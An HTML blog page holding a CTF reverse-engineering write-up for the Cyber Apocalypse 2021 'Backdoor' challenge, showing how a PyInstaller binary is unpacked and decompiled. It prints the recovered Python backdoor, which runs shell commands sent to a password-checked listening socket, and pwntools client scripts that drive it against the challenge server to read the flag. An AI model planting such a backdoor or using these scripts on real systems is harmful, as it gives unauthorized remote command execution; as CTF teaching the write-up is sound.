<!DOCTYPE html>

<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title>My Blog - 2021-04-CyberApocalypse2021 - Backdoor</title>

    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Abraxus">
    <!-- FontAwesome JS-->
    <script defer src="../../assets/js/fontawesome.min.js"></script>

    <!-- Theme CSS -->
    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
</head>
<body class="theme-bg-light">

    <header class="header text-center">
    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>

    <nav class="navbar navbar-expand-lg navbar-dark">

        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>

        <div id="navigation" class="collapse navbar-collapse flex-column">
            <div class="profile-section pt-3 pt-lg-0">
                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">

                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                <ul class="social-list list-inline py-3 mx-auto">
                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                </ul><!--//social-list-->
                <hr>
            </div><!--//profile-section-->

            <ul class="navbar-nav flex-column text-center">
                <li class="nav-item">
                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
                </li>
            </ul>

            <div class="my-2 my-md-3 text-center">
                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
            </div>
        </div>
    </nav>
</header>

    <div class="main-wrapper">

        <article class="markdown-section my-5 mx-5">
            <h1 id="cyber-apocalypse-2021-backdoor-write-up">Cyber Apocalypse 2021 Backdoor Write Up</h1>
<h2 id="details">Details:</h2>
<p>Points: 300</p>
<p>Jeopardy style CTF</p>
<p>Category: Reverse Engineering</p>
<p>Comments:</p>
<pre><code class="language-text">One of our friends has left a backdoor on the extraterrestrials' server. If we manage to take advantage of it, we will be able to control all the doors and lock them outside or open doors to facilites we have no access.
This challenge will raise 43 euros for a good cause.</code></pre><h2 id="write-up">Write up:</h2>
<p>After extracting the .zip file we see a file named bd. Running strings on it we see some interesting stuff:</p>
<pre><code class="language-text">strings bd | grep python

b_asyncio.cpython-38-x86_64-linux-gnu.so
b_bz2.cpython-38-x86_64-linux-gnu.so
b_codecs_cn.cpython-38-x86_64-linux-gnu.so
b_codecs_hk.cpython-38-x86_64-linux-gnu.so
b_codecs_iso2022.cpython-38-x86_64-linux-gnu.so
b_codecs_jp.cpython-38-x86_64-linux-gnu.so
b_codecs_kr.cpython-38-x86_64-linux-gnu.so
b_codecs_tw.cpython-38-x86_64-linux-gnu.so
b_contextvars.cpython-38-x86_64-linux-gnu.so
b_ctypes.cpython-38-x86_64-linux-gnu.so
b_decimal.cpython-38-x86_64-linux-gnu.so
b_hashlib.cpython-38-x86_64-linux-gnu.so
b_lzma.cpython-38-x86_64-linux-gnu.so
b_multibytecodec.cpython-38-x86_64-linux-gnu.so
b_multiprocessing.cpython-38-x86_64-linux-gnu.so
b_opcode.cpython-38-x86_64-linux-gnu.so
b_posixshmem.cpython-38-x86_64-linux-gnu.so
b_queue.cpython-38-x86_64-linux-gnu.so
b_ssl.cpython-38-x86_64-linux-gnu.so
blibpython3.8.so.1.0
bmmap.cpython-38-x86_64-linux-gnu.so
breadline.cpython-38-x86_64-linux-gnu.so
bresource.cpython-38-x86_64-linux-gnu.so
btermios.cpython-38-x86_64-linux-gnu.so
xinclude/python3.8/pyconfig.h
xlib/python3.8/config-3.8-x86_64-linux-gnu/Makefile
&libpython3.8.so.1.0</code></pre>
<p>This means that this file is a python .pyc compiled with pyinstaller. This was confirmed by running binwalk and seeing a zip archive inside containing the pyinstaller includes. Since this is a linux executable and not an exe we cannot just use the basic tools. First we need to extract the .pyc data. This is done by running:</p>
<pre><code class="language-text">objcopy --dump-section pydata=pydata.dump ./bd </code></pre>
<p>We can then run one of the many pyinstaller extractors, I used pyinstxtractor, <a href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a> (make sure to use the python version it was compiled with):</p>
<pre><code class="language-text">python3.8 ./pyinstxtractor/pyinstxtractor.py pydata.dump

[+] Processing pydata.dump
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6994886 bytes
[+] Found 45 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: bd.pyc
[+] Found 223 files in PYZ archive
[+] Successfully extracted pyinstaller archive: pydata.dump

You can now use a python decompiler on the pyc files within the extracted directory
</code></pre>
<p>We now see the bd.pyc file, after decompilation we get:</p>
<pre><code class="language-python">import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    client, addr = sock.accept()
    data = client.recv(32)
    if len(data) != 32:
        client.close()
    elif data.decode() != md5('s4v3_th3_w0rld').hexdigest():
        client.send('Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith('command:'):
            client.close()
        else:
            command = command.replace('command:', '')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()</code></pre>
<p>We see that we need to connect, then send the md5, then the length of whatever command, then &quot;command:&lt;command to send&gt;&quot;.</p>
<p>So the first script we send ls to see what is on the system:</p>
<pre><code class="language-python"># import pwntools
from pwn import *

# command to send
command = 'command:ls'

# connection
s = remote("138.68.179.198", 30791)

# send the md5
s.send('e2162a8692df4e158e6fd33d1467dfe0')

# send length of command
s.send(chr(len(command)))

# send command
s.send(command)

# read responses
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())
print(s.recvline())</code></pre>
<p>The response from this is:</p>
<pre><code class="language-text">[+] Opening connection to 138.68.179.198 on port 30791: Done
b'bd.py\n'
b'bin\n'
b'dev\n'
b'etc\n'
b'flag.txt\n'
b'home\n'
b'lib\n'
b'media\n'</code></pre>
<p>We then read the flag:</p>
<pre><code class="language-python"># import pwntools
from pwn import *

# command to send
command = 'command:cat flag.txt'

# connection
s = remote("138.68.179.198", 30791)

# send the md5
s.send('e2162a8692df4e158e6fd33d1467dfe0')

# send length of command
s.send(chr(len(command)))

# send command
s.send(command)

# read responses
print(s.recvline())</code></pre><pre><code class="language-text">[+] Opening connection to 138.68.179.198 on port 30791: Done
b'CHTB{b4ckd00r5_4r3_d4nG3r0u5}\n'</code></pre>
        </article>

        <footer class="footer text-left py-2 theme-bg-dark">

    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>

</footer>

    </div><!--//main-wrapper-->
    <!-- Javascript -->
    <script src="../../assets/js/popper.min.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script src="../../assets/js/prism.js"></script>
</body>
</html>